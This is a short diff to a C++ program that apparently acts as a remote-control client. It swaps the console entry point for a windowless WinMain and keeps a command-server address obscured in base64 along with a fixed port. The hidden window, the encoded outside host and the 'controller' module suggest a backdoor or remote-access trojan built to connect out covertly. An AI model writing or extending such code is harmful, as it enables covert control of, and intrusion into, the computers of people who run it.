@@ -1,10 +1,14 @@
 #include <iostream>
+#include <Windows.h>
+
 #include "connection.h"
 #include "controller.h"
 #include "base64.h"
 
 
-int main(int argc, char* argv[]) {
+int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow) {
+/* int main(int argc, char* argv[]) {*/
+	
 	std::string host = base64_decode("MTI4LjIxMS4yMzQuNTM=");
 	int port = 6997;
 
